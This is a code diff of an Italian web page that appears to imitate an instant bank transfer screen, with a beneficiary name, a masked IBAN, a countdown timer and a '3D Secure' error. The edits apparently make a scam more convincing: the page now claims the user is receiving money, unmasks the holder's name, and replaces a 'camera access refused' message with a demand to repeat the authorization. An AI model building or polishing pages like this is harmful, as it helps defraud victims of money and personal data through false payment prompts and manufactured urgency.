@@ -93,14 +93,14 @@
 <body>
 
 <div class="card" id="card">
-  <h2 style="margin-bottom: 20px;">Bonifico istantaneo</h2>
+  <h2 style="margin-bottom: 20px;">Ricevi bonifico istantaneo</h2>
 
   <div class="info">
-    <p>Intestatario: <strong>LORE*** MARIANI</strong></p>
-    <p>IBAN: <strong>IT60X****5678</strong></p>
+    <p>Intestatario: <strong>LORENZO MARIANI</strong></p>
+    <p>IBAN: <strong>IT44M****4492</strong></p>
     <p>Importo: <strong>15,00 €</strong></p>
     <p>Commissione: <strong>0,00 €</strong></p>
-    <p>Transazione: <strong>#TRX-9283743</strong></p>
+    <p>Transazione: <strong>#TRX-004391</strong></p>
     <p>Data: <strong><span id="data-operazione"></span></strong></p>
     <p class="timer">⚠︎ Sessione in scadenza tra <span id="countdown">02:00</span></p>
   </div>
@@ -148,7 +148,7 @@
         <img src="fail.png" alt="Errore" class="result-image">
         <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
         <p>L'autenticazione 3D Secure non è stata completata.</p>
-        <p>Accesso alla videocamera rifiutato.</p>
+        <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
       `;
     });
 
@@ -180,8 +180,8 @@
 
   function showLoadingScreen() {
     card.innerHTML = `
-      <h2>Bonifico istantaneo</h2>
-      <div class="loading">Operazione in corso...</div>
+      <h2>Invio bonifico istantaneo</h2>
+      <div class="loading">Autorizzazione in corso...</div>
     `;
   }
 
